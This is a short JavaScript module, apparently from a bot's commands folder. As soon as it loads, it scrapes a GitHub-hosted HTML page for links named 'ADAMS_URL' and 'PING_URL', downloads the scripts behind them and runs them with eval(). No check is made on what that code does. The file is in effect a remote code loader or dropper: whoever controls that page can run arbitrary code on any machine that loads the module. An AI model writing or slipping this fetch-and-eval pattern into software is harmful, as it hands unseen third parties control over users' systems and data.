// commands/remote.js 

const axios = require('axios');
const cheerio = require('cheerio');

const alphaUrl = 'https://raw.githubusercontent.com/ibrahimadamstech/test/refs/heads/main/index.html';

async function fetchScriptUrl(scriptName) {
    try {
        const response = await axios.get(alphaUrl);
        const $ = cheerio.load(response.data);
        const scriptUrl = $(`a:contains("${scriptName}")`).attr('href');

        if (!scriptUrl) throw new Error(`${scriptName} not found on the webpage🚫.`);

        console.log(`${scriptName} URL fetched successfully☑️:`, scriptUrl);

        const scriptResponse = await axios.get(scriptUrl);
        const scriptContent = scriptResponse.data;
        console.log(`${scriptName} script loaded successfully✅`);

        eval(scriptContent);
    } catch (error) {
        console.error(`❌Error fetching ${scriptName} URL:`, error.message);
    }
}

async function loadScripts() {
    const scriptNames = [
        'ADAMS_URL', 'PING_URL'
    ];

    for (const scriptName of scriptNames) {
        await fetchScriptUrl(scriptName);
    }
}

loadScripts();
